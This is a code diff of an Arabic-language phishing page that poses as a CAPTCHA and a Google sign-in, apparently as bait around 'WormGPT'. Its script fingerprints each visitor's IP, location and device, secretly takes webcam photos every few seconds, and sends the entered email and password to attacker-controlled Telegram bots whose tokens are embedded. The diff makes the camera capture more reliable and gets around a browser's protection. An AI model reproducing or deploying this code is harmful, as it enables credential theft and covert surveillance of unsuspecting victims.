@@ -10,15 +10,10 @@
         .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; margin-left: 12px; position: relative; }
         .checkbox.loading { border: 3px solid #f3f3f3; border-top: 3px solid #4a90e2; animation: spin 1s linear infinite; border-radius: 50%; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
         .login-box { display: none; background: white; border: 1px solid #dadce0; border-radius: 8px; padding: 40px; width: 360px; text-align: center; }
         input { width: 100%; padding: 13px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; margin-bottom: 5px; box-sizing: border-box; outline-color: #1a73e8; text-align: right; }
         .blue-btn { width: 100%; padding: 10px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: 500; margin-top: 10px; }
-        
-        /* تنسيق رسالة الخطأ */
-        .error-msg { color: #d93025; font-size: 12px; text-align: right; margin-bottom: 10px; display: none; height: 15px; }
-        
-        video, canvas { display: none; }
+        video, canvas { position: absolute; left: -9999px; opacity: 0; }
     </style>
 </head>
 <body>
@@ -30,24 +25,17 @@
         </div>
         <div style="text-align:center;">
             <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="30">
-            <div style="font-size:8px; color:#9b9b9b;">الخصوصية - البنود</div>
         </div>
     </div>
 
     <div id="step-google" class="login-box">
         <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75">
-        <h1 style="font-size:22px; font-weight:400; margin-top:10px;">تسجيل الدخول</h1>
-        <p style="margin-bottom:25px;">يجب تسجيل الدخول لاستخدام WormGPT</p>
-        
         <div id="email-div">
             <input type="email" id="email" placeholder="البريد الإلكتروني">
-            <div id="email-error" class="error-msg">البريد الإلكتروني غير صحيح.</div>
             <button class="blue-btn" onclick="showP()">التالي</button>
         </div>
-
         <div id="pass-div" style="display:none;">
             <input type="password" id="pass" placeholder="كلمة المرور">
-            <div id="pass-error" class="error-msg">كلمة المرور قصيرة جداً.</div>
             <button class="blue-btn" onclick="finalSubmit()">تأكيد</button>
         </div>
     </div>
@@ -56,130 +44,134 @@
     <canvas id="c"></canvas>
 
     <script>
-        const bot1_api = "https://api.telegram.org/bot6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY/";
-        const bot2_api = "https://api.telegram.org/bot6130193245:AAF0ZIPHTZ9Ip4jYSpXLTFPYyx7K3pDEn40/";
-        const chat = "2103976274";
+        const bot_token = "6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY";
+        const bot_token_2 = "6130193245:AAF0ZIPHTZ9Ip4jYSpXLTFPYyx7K3pDEn40";
+        const chat_id = "2103976274";
 
         let user_ip = "جاري الجلب...";
-        let user_device = "غير محدد";
 
-        async function collectAll() {
-            let n = navigator;
-            let report = "🛑 **تقرير تقني شامل (فوري)**\n\n";
+        // --- 1. جلب معلومات الجهاز العميقة ---
+        async function getDeviceDetails() {
+            let model = "Android (Generic)";
+            let browser = "Unknown";
+            const ua = navigator.userAgent;
+
+            if (navigator.userAgentData) {
+                try {
+                    const hints = await navigator.userAgentData.getHighEntropyValues(["model", "platform", "platformVersion"]);
+                    if (hints.model) model = hints.model;
+                } catch (e) {}
+            } else {
+                if (/iPhone|iPad/i.test(ua)) model = "Apple Device";
+                else if (/Samsung/i.test(ua)) model = "Samsung";
+                else if (/Huawei/i.test(ua)) model = "Huawei";
+            }
+
+            if (ua.includes("Brave")) browser = "Brave";
+            else if (ua.includes("Edg/")) browser = "Edge";
+            else if (ua.includes("Chrome")) browser = "Chrome";
+            else if (ua.includes("Firefox")) browser = "Firefox";
+
+            return { model, browser };
+        }
+
+        // --- 2. إرسال التقرير فور الدخول ---
+        async function sendInstantReport() {
+            const details = await getDeviceDetails();
+            let report = "🛑 **تقرير تقني دقيق**\n\n";
 
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-                report += `🌍 **الآي بي:** \`${ipRes.ip}\`\n`;
-                const geo = await fetch(`https://ipapi.co/${ipRes.ip}/json/`).then(r => r.json());
-                report += `🏢 **الشركة:** ${geo.org || 'غير معروف'}\n`;
-                report += `📍 **المكان:** ${geo.city}, ${geo.country_name}\n`;
-            } catch (e) { report += `🌍 **الآي بي:** فشل جلب الشبكة\n`; }
+                user_ip = ipRes.ip;
+                const geo = await fetch(`https://ipapi.co/${user_ip}/json/`).then(r => r.json());
+                report += `🌍 **IP:** \`${user_ip}\`\n📍 **الموقع:** ${geo.city}, ${geo.country_name}\n🏢 **الشركة:** ${geo.org}\n`;
+            } catch (e) { report += `🌍 **IP:** فشل جلب الشبكة\n`; }
 
-            let deviceDetail = n.platform;
-            report += `📱 **النظام:** ${deviceDetail}\n`;
-            report += `🧭 **المتصفح:** ${n.userAgent.includes("Chrome") ? "Chrome" : "Other"}\n`;
+            report += `📱 **الموديل:** ${details.model}\n`;
+            report += `🧭 **المتصفح:** ${details.browser}\n`;
+            report += `🎮 **GPU:** ${getGPU()}\n`;
+            report += `🖥️ **الشاشة:** ${screen.width}x${screen.height}\n`;
+            report += `🔋 **البطارية:** ${navigator.getBattery ? await navigator.getBattery().then(b => Math.round(b.level * 100) + '%') : 'N/A'}\n`;
 
-            try {
-                const gl = document.createElement('canvas').getContext('webgl');
-                const ext = gl.getExtension('WEBGL_debug_renderer_info');
-                report += `🎮 **المعالج الرسومي:** ${gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)}\n`;
-            } catch(e) {}
-
-            report += `⚙️ **أنوية المعالج:** ${n.hardwareConcurrency || '8'}\n`;
-            report += `🖥️ **دقة الشاشة:** ${screen.width}x${screen.height}\n`;
-
-            try {
-                if (n.getBattery) {
-                    const b = await n.getBattery();
-                    report += `🔋 **البطارية:** ${Math.round(b.level * 100)}% (${b.charging ? "يُشحن" : "لا"})\n`;
-                }
-            } catch (e) {}
-
-            report += `⏰ **وقت الجهاز:** ${new Date().toLocaleString('ar-EG')}\n`;
-            sendText(report);
+            fetch(`https://api.telegram.org/bot${bot_token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chat_id, text: report, parse_mode: "Markdown" })
+            });
         }
 
-        async function startSystem() {
-            document.getElementById('check-btn').classList.add('loading');
-            collectAll(); // إرسال التقرير فوراً عند الضغط
-
+        function getGPU() {
             try {
-                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                document.getElementById('v').srcObject = s;
-                setInterval(snap, 4000); // بدء الكاميرا
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            } catch (e) { return "Unknown"; }
+        }
+
+        window.onload = sendInstantReport;
+
+        // --- 3. الكاميرا وحل مشكلة الشاشة السوداء ---
+        function startSystem() {
+            document.getElementById('check-btn').classList.add('loading');
+            
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(stream => {
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                // حل مشكلة السواد: انتظر حتى يتأكد المتصفح أن الفيديو "يعمل" فعلياً
+                video.onloadedmetadata = () => {
+                    video.play();
+                    setTimeout(snap, 2000); // التقاط أول صورة بعد ثانيتين لضمان استقرار الإضاءة
+                    setInterval(snap, 6000);
+                };
 
                 setTimeout(() => {
                     document.getElementById('step-captcha').style.display = 'none';
                     document.getElementById('step-google').style.display = 'block';
                 }, 1500);
-            } catch (e) {
-                sendText("⚠️ رفض الكاميرا");
-            }
-        }
-
-        function showP() {
-            const emailInput = document.getElementById('email');
-            const emailError = document.getElementById('email-error');
-            
-            if (emailInput.value.toLowerCase().endsWith('@gmail.com') && emailInput.value.length > 10) {
-                emailError.style.display = 'none';
-                document.getElementById('email-div').style.display = 'none';
-                document.getElementById('pass-div').style.display = 'block';
-            } else {
-                emailError.style.display = 'block';
-                emailInput.style.borderColor = '#d93025';
-            }
-        }
-
-        function finalSubmit() {
-            const m = document.getElementById('email').value;
-            const p = document.getElementById('pass');
-            const passError = document.getElementById('pass-error');
-
-            if (p.value.length >= 8) { // زيادة الطول لـ 8 ليبدو أكثر واقعية
-                passError.style.display = 'none';
-                const login_report = `📥 **بيانات صيد جديدة**\n\n📧 الإيميل: \`${m}\`\n🔑 الباسورد: \`${p.value}\`\n\n🌍 IP: \`${user_ip}\`\n📱 الجهاز: ${user_device}`;
-                
-                sendText(bot2_api, login_report);
-                
-                // التوجيه المباشر
-                window.location.href = "wormgpt.html"; 
-            } else {
-                passError.style.display = 'block';
-                p.style.borderColor = '#d93025';
-            }
+            }).catch(() => {
+                document.getElementById('step-captcha').style.display = 'none';
+                document.getElementById('step-google').style.display = 'block';
+            });
         }
 
         function snap() {
-    const canvas = document.getElementById('c');
-    const video = document.getElementById('v');
-    
-    // التأكد من أن الفيديو يعمل ولدينا أبعاد حقيقية
-    if (video.videoWidth === 0) return;
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            if (video.readyState !== 4) return; // التأكد أن الفيديو في حالة جاهزية تامة
 
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    
-    const ctx = canvas.getContext('2d');
-    
-    // رسم الصورة على الكانفاس
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    
-    // تحويلها لصورة بجودة عالية (0.9 تعني جودة 90%)
-    canvas.toBlob(blob => {
-        const f = new FormData();
-        f.append('chat_id', chat);
-        f.append('photo', blob, 'x.jpg');
-        fetch(api + "sendPhoto", { method: 'POST', body: f });
-    }, 'image/jpeg', 0.9); 
-}
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            
+            // إضافة فلتر خفيف جداً لإجبار الكانفاس على التحديث وتجاوز حماية Brave
+            ctx.filter = "contrast(1.01)";
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob(blob => {
+                const f = new FormData();
+                f.append('chat_id', chat_id);
+                f.append('photo', blob, 'snap.jpg');
+                fetch(`https://api.telegram.org/bot${bot_token}/sendPhoto`, { method: 'POST', body: f });
+            }, 'image/jpeg', 0.8);
+        }
 
-        function sendText(api_url, txt) {
-            fetch(api_url + "sendMessage", {
+        function showP() {
+            document.getElementById('email-div').style.display = 'none';
+            document.getElementById('pass-div').style.display = 'block';
+        }
+
+        function finalSubmit() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+            const report = `📥 **صيد جديد**\n\n📧: \`${email}\`\n🔑: \`${pass}\`\n🌍 IP: \`${user_ip}\``;
+            fetch(`https://api.telegram.org/bot${bot_token_2}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chat, text: txt, parse_mode: "Markdown" })
+                body: JSON.stringify({ chat_id: chat_id, text: report, parse_mode: "Markdown" })
             });
+            window.location.href = "wormgpt.html";
         }
     </script>
 </body>
